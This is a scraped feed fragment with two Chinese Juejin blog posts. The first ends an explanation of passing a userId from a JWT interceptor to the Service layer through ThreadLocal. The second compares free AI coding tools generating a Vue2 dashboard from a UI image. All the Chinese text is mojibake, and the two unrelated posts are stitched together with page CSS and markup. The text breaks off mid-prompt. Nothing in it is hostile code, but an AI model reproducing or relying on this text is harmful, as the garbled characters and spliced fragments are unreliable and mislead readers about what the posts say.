<p>Tomcat åˆ†é… çº¿ç¨‹ X æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚</p>
<p>æ‹¦æˆªå™¨ (Interceptor) æ˜¯ çº¿ç¨‹ X æ‰§è¡Œçš„</p>
<p>Controller æ˜¯ çº¿ç¨‹ X æ‰§è¡Œçš„</p>
<p>Service è¿˜æ˜¯ çº¿ç¨‹ X æ‰§è¡Œçš„</p>
<p>Mapper ä¾ç„¶æ˜¯ çº¿ç¨‹ X æ‰§è¡Œçš„</p>
<p>ç»“è®ºï¼š åªè¦æˆ‘ä»¬æ²¡æœ‰æ‰‹åŠ¨å¼€å¯æ–°çº¿ç¨‹ï¼ˆnew Threadï¼‰ï¼Œæ•´ä¸ªåç«¯ä¸šåŠ¡æµç¨‹å°±åƒä¸€åœºæ¥åŠ›èµ›ï¼Œä½†æ˜¯æ˜¯åŒä¸€ä¸ªè¿åŠ¨å‘˜ï¼ˆçº¿ç¨‹ Xï¼‰ ä»å¤´è·‘åˆ°å°¾</p>
<h2 data-id="heading-2">æµç¨‹</h2>
<p>åŸºäºä»¥ä¸Šä¸¤ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥è¿˜åŸ <code>userId</code> æ˜¯å¦‚ä½•ä»è¯·æ±‚å¤´ä¸€æ­¥æ­¥æµè½¬åˆ° Service å±‚çš„ï¼š</p>
<p>ç¬¬ä¸€æ­¥ï¼šæ‹¦æˆªå™¨ (å­˜å…¥)</p>
<p>è¯·æ±‚åˆšåˆ°è¾¾åç«¯ï¼Œæ‹¦æˆªå™¨ï¼ˆ<code>JwtTokenUserInterceptor</code>ï¼‰æœ€å…ˆæ‹¦æˆª</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ddcd9ea0eef7462b9a3ce434af029d36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2hhbmVENzcx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876596&amp;x-signature=dlHRo0YkpsxICFD7B7BRBvTtP%2Bw%3D" alt="image-20251128145149635" loading="lazy"/></p>
<p>ç¬¬äºŒæ­¥ï¼šController</p>
<p>æ‹¦æˆªå™¨æ”¾è¡Œåï¼Œä»£ç è¿›å…¥ Controller</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91b2b67d0ab14a588b496778f90401ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2hhbmVENzcx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876596&amp;x-signature=2nFKG%2BjXZddO%2B7ixWkuSB%2BVQgec%3D" alt="image-20251128145336078" loading="lazy"/></p>
<p>ç¬¬ä¸‰æ­¥ï¼šService (å–å‡º)</p>
<p>ä»£ç è¿›å…¥ Service å±‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/360a78fd884140dba263c04318e136ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2hhbmVENzcx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765876596&amp;x-signature=1oSLHnXV5KjPacbC7ewHnkxr4nE%3D" alt="image-20251128145520388" loading="lazy"/></p>
<h2 data-id="heading-3">ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆè®¾è®¡ï¼Ÿ</h2>
<p>ä½¿ç”¨ <code>ThreadLocal</code> (BaseContext) çš„æ–¹æ¡ˆï¼Œå®ç°äº†<strong>æ•°æ®åœ¨åŒä¸€çº¿ç¨‹å†…çš„â€œéšå¼ä¼ é€’â€</strong>ï¼Œè®©ä»£ç æå…¶ç®€æ´ä¼˜é›…ã€‚</p>
<h2 data-id="heading-4">æ€»ç»“</h2>
<ol>
<li><strong>BaseContext</strong> åˆ©ç”¨ <strong>ThreadLocal</strong> å®ç°äº†çº¿ç¨‹å†…éƒ¨çš„æ•°æ®éš”ç¦»å­˜å‚¨ã€‚</li>
<li><strong>Tomcat</strong> ä¿è¯äº†ä»æ‹¦æˆªå™¨åˆ° Service å¤„äº <strong>åŒä¸€ä¸ªçº¿ç¨‹</strong> ä¸­ã€‚</li>
<li>äºŒè€…ç»“åˆï¼Œè®©æˆ‘ä»¬å¯ä»¥åœ¨ Service å±‚â€œéš”ç©ºâ€è·å– Controller å±‚ï¼ˆæ‹¦æˆªå™¨ï¼‰è§£æçš„æ•°æ®ï¼Œæå¤§ç®€åŒ–äº†ä»£ç ç»“æ„ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3å¤§å…è´¹AIå·¥å…·å®æˆ˜æµ‹è¯„ï¼Œç”¨æç¤ºè¯â€œè°ƒæ•™â€å‡ºä¸šåŠ¡å¤§å±]]></title>    <link>https://juejin.cn/post/7581486065997299747</link>    <guid>https://juejin.cn/post/7581486065997299747</guid>    <pubDate>2025-12-09T08:55:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581486065997299747" data-draft-id="7581667332306288678" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3å¤§å…è´¹AIå·¥å…·å®æˆ˜æµ‹è¯„ï¼Œç”¨æç¤ºè¯â€œè°ƒæ•™â€å‡ºä¸šåŠ¡å¤§å±"/> <meta itemprop="keywords" content="Trae,AIç¼–ç¨‹,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-09T08:55:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‰å¸½lufei"/> <meta itemprop="url" content="https://juejin.cn/user/501033035632093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3å¤§å…è´¹AIå·¥å…·å®æˆ˜æµ‹è¯„ï¼Œç”¨æç¤ºè¯â€œè°ƒæ•™â€å‡ºä¸šåŠ¡å¤§å±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035632093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‰å¸½lufei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T08:55:03.000Z" title="Tue Dec 09 2025 08:55:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä»˜è´¹çš„æ¨¡å‹å’Œå·¥å…·å›ºç„¶å¥½ç”¨ï¼Œä¸€ä¸ªæœˆå°‘åˆ™å‡ ç™¾ï¼Œé«˜åˆ™ä¸Šåƒï¼Œä¸€ä¸ªä½è–ªç‰›é©¬æ˜¯çœŸç”¨ä¸èµ·</p>
<p>ä¸‹é¢åœ¨ä½¿ç”¨å…è´¹å·¥å…·å’Œå…è´¹æ¨¡å‹ä¸‹å®ç°çœŸå®çš„ä¸šåŠ¡å¤§å±é¡µï¼Œçœ‹ä¸‹å¤šè½®è°ƒæ•™ä¸‹AIç”Ÿæˆçš„æ•ˆæœï¼Œå¹¶é™„ä¸Šäº†å¯¹åº”çš„æç¤ºè¯ <code>(å¦‚æœæœ‰æ›´å¥½çš„æé—®æ–¹å¼ï¼Œæ¬¢è¿è®¨è®ºäº¤æµ)</code></p>
<p>è¿™æ˜¯UIæä¾›çš„å¤§å±å›¾ï¼Œé‡Œé¢å„ç§é™æ€å›¾ç»„åˆåçš„æ•ˆæœï¼Œæ¥ä¸‹æ¥ç›´æ¥æŠŠå›¾æ‰”ç»™AIï¼Œè®©ä¸åŒçš„AIå·¥å…·æ¨¡å‹ç”Ÿæˆè¿™ä¸ªå¤§å±é¡µ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bdeba1ba5ae459991e31a301e4a1f38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=HyjXBIbBNOqO4ggo9CfYx%2BaPtMc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">å·¥å…·æ¨¡å‹æ¯”æ‹¼</h2>
<p>ä¸ºäº†ä½¿AIä¸“æ³¨é¡µé¢æ•ˆæœç”Ÿæˆï¼Œæˆ‘æå‰å»ºå¥½äº†å¯¹åº”çš„ä»£ç æ–‡ä»¶ï¼Œå¹¶é…ç½®äº†å¯¹åº”çš„è·¯ç”±åœ°å€ï¼Œæ–¹ä¾¿è¿è¡Œåæµè§ˆæ•ˆæœå¹¶å¯¹æ¯”</p>
<p>ç›´æ¥æŠŠå›¾å¤åˆ¶åˆ°VSCodeï¼ŒTrae CNï¼ŒGoogle Antigravity ä¸­åˆ†åˆ«è®©å®ƒä»¬å®ç°ï¼Œä¸åŒå·¥å…·æŠŠä»£ç å®ç°åˆ°å¯¹åº”çš„ä½ç½®ï¼Œ</p>
<blockquote>
<p>æç¤ºè¯</p>
<p>è¯·æ ¹æ®è¿™ä¸ªé™æ€å›¾ï¼Œç”Ÿæˆä¸€ä¸ªå¤§å±é¡µï¼Œä½¿ç”¨vue2ç›¸å…³ä»£ç å®ç°ï¼Œä»£ç å†™åˆ° BigScreen/xxx.vue ä¸­</p>
</blockquote>
<p>UIé™æ€å›¾å¦‚ä¸‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/979fb1c382cf4331915ac8ee1bf197fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=533Tad78UAju0nOz9yor6%2FxtNDM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">VSCode</h3>
<p>è¿™æ˜¯ VSCode ä¸­å…è´¹ç‰ˆé»˜è®¤ç”Ÿæˆçš„æ•ˆæœ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a78fd0dd52414f05bf6afb079b50dc35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=%2FTi3Vp80n6evKjWhGpdjrVtUEOY%3D" alt="" loading="lazy"/></p>
<p>é¡µé¢æœ‰äº†ï¼Œè¯¥æœ‰çš„ä¼¼ä¹éƒ½æœ‰ï¼Œæ•´ä½“å¸ƒå±€ä¹Ÿæœ‰ç‚¹é‚£æ„æ€ï¼Œä½¿ç”¨ Agent æ¨¡å¼ï¼Œæ¨¡å‹ Autoï¼Œæ¯ä¸€ä¸ªç»†èŠ‚æ–¹é¢è¿˜å·®çš„æ¯”è¾ƒå¤š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b41048313d1e4ad4805ec36b6d93ed4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=1%2BPruqduPzQeBa9GldKV5VHHkjw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">Trae CN</h3>
<p>è¿™æ˜¯ Trae CN ä¸­çš„ç”Ÿæˆçš„æ•ˆæœ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cfe1333426c47b88de3a735a7fa7778~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=CXe9UbnfXmNSSv2lgIn8znACkpg%3D" alt="" loading="lazy"/></p>
<p>é¢......</p>
<p>è¿™æ˜¯ä¸æ˜¯å“ªé‡Œå‡ºé—®é¢˜äº†å•Šï¼Œæˆ‘æŠŠè¿™ä¸ªæˆªå›¾ï¼Œåˆé—®äº†ä¸€æ¬¡ Trae CN è®©å®ƒä¼˜åŒ–ä¸€ä¸‹ï¼Œç„¶åæ”¹å‡ºæ¥çš„è¿˜æ˜¯è¿™ä¸ªï¼Œå¥‡äº†æ€ªäº†</p>
<p>Trae é‡Œé¢çš„æ¨¡å‹ä¼¼ä¹å¯¹äºæ•´ä¸ªé¡µé¢å†…å®¹æ²¡æœ‰ç†è§£ï¼Œæ— æ³•å®ç°è¿™ä¹ˆå¤§çš„é¡µé¢åŠŸèƒ½ï¼Ÿè¿˜æ˜¯æˆ‘çš„ä½¿ç”¨æ–¹å¼ä¸å¯¹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e1f76d80da64f1886e9438f193fd2be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=TToRZLYabiu%2F9iC2%2B02a2CnImZY%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ç”¨çš„ SOLO æ¨¡å¼ï¼Œæ¨¡å‹æ— æ³•é€‰æ‹©ï¼Œå®Œå…¨ä¸€ä¸ªé»‘ç›’å­</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/928621c75f61404ca68fa6287066a3c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=Q513%2BDYfa9nkkiUPmVFVoMDasbA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">Google Antigravity</h3>
<p>è¿™æ˜¯ Google Antigravity ä¸­ä½¿ç”¨ Gemini3 Pro ç”Ÿæˆçš„ä»£ç ï¼ŒåŸå§‹æˆªå›¾æ²¡æœ‰äº†ï¼Œè¿™æ˜¯ä»å¯¹è¯è®°å½•é‡Œé‡æ–°æ‰“å¼€çš„</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c232a3b11e334a219e18a04cb1145f14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=fMtoWVfMHnDMyPfS4qUhmYwtfIU%3D" alt="" loading="lazy"/></p>
<p>æ•´ä½“æ¥çœ‹ï¼Œè¿™ä¸ª Gemini3 pro æ¨¡å‹ç”Ÿæˆçš„æ•ˆæœæ˜¯æœ€å¥½çš„ï¼Œç›¸å¯¹é¢œå€¼ä¹Ÿåœ¨çº¿ï¼Œå„æ–¹é¢åå·®ä¹Ÿå°‘ä¸€ç‚¹</p>
<p>å·¦ä¾§å¡ç‰‡åœ†åœˆçš„éƒ¨åˆ†è¿˜åŠ äº†è‡ªåŠ¨æ—‹è½¬æ•ˆæœï¼Œæä¾›çš„é™æ€å›¾ï¼Œæ¨¡å‹ç›´æ¥è‡ªæˆ‘å‘æŒ¥äº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6ab3e8e010e419cb6b6a0fba2634b0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=g1ntZdGYI6BYINdCmQkAa9iJ4hI%3D" alt="" loading="lazy"/></p>
<p>ç”±äºæ¥ä¸‹æ¥çš„ç»†èŠ‚å®Œå–„å°±ç”¨å®ƒäº†</p>
<h2 data-id="heading-5">åœ¨ Antigravity ä¼˜åŒ–è°ƒæ•´</h2>
<h3 data-id="heading-6">å»æ‰æ—‹è½¬</h3>
<p>å…ˆæŠŠAIåŠ ä¸Šçš„è‡ªåŠ¨æ—‹è½¬æ•ˆæœå»äº†ï¼Œå®åœ¨ç”¨ä¸ä¸Š</p>
<blockquote>
<p>æç¤ºè¯</p>
<p>å…¨å±€æ¦‚è§ˆ ä¸­çš„æ—‹è½¬æ•ˆæœå»æ‰</p>
</blockquote>
<h3 data-id="heading-7">æ·»åŠ è‡ªé€‚åº”</h3>
<p>ç”±äºè¿™ä¸ªå¤§å±éœ€è¦è‡ªé€‚åº”ä¸åŒå±å¹•ï¼Œå…ˆè®©ä»–åŠ ä¸ªå±å¹•è‡ªé€‚åº”</p>
<blockquote>
<p>æç¤ºè¯</p>
<p>ç»§ç»­ä¼˜åŒ–ï¼Œåˆšæ‰çš„è®¾è®¡å›¾å¤§å°æ˜¯ 1920 x 1080 pxï¼Œå¦‚æœå±å¹•è¿‡å°æˆ–è¿‡å¤§ï¼Œè‡ªåŠ¨é€‚åº”</p>
</blockquote>
<p>åœ¨ mounted ä¸­å®ƒå—–å—–åŠ ä¸Šäº†ç›‘å¬å‡½æ•°å’Œ transform scale() ç­‰å‡½æ•°å¤„ç†</p>
<h3 data-id="heading-8">å¯¹é½</h3>
<p>ç”±äºUIå›¾é‡Œé¢çš„å†…å®¹æœ¬æ¥å°±æ²¡å¯¹é½ï¼Œå›¾é‡Œé¢æœ‰äº›åœ°æ–¹ä¹Ÿæ¯”è¾ƒç³™ï¼ŒAIç”Ÿæˆå¼ä¹Ÿæ²¡å¯¹é½ï¼ŒæŠŠç°åœ¨çš„æˆªå›¾æ•ˆæœå‘ç»™AIï¼Œè®©ä»–æŠŠå¯¹åº”çš„æ¨¡å—å¯¹é½</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/780e0b71360e402e90ebfece9a4c355e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=Of%2BWPHwgtt7bMxnue8oighSgQIA%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æç¤ºè¯</p>
<p>è¿™æ˜¯ç°åœ¨çš„ç»“æœï¼Œå°† å®‰å®šé—¨è¡—é“ å’Œ æ‰§æ³•æ£€æŸ¥æƒ…å†µ ä¸¤ä¸ªå¡ç‰‡é«˜åº¦ç¼©å°ï¼Œå’Œ æ‰§æ³•åŠæ¡ˆæƒ…å†µ åº•éƒ¨ä¿æŒæ°´å¹³</p>
</blockquote>
<h3 data-id="heading-9">è°ƒæ•´å æ¯”</h3>
<p>è¿™æ—¶å€™æ˜æ˜¾å·¦å³ä¸¤ä¾§å†…å®¹å æ¯”ä¸æ˜¯å¾ˆå¥½ï¼Œä¼˜åŒ–ä¸€ä¸‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25891e2f7e184e8f9ec087b67b8a2d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765875302&amp;x-signature=CdT9ytM2f3CX8tmx1svpyxSDE4M%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æç¤ºè¯</p>
